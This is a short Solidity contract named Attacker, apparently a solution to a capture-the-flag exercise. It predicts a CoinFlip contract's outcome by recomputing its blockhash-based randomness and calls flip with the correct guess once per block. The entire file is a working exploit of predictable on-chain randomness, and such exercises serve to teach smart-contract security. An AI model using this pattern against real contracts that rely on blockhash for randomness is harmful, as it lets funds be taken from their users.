// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attacker {
    using SafeMath for uint256;
    CoinFlip coinFlipContract;
    uint256 public lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipContractAddress) {
        coinFlipContract = CoinFlip(_coinFlipContractAddress);
    }

    function hasBlockChanged() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        return lastHash != blockValue;
    }

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        if (!hasBlockChanged()) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
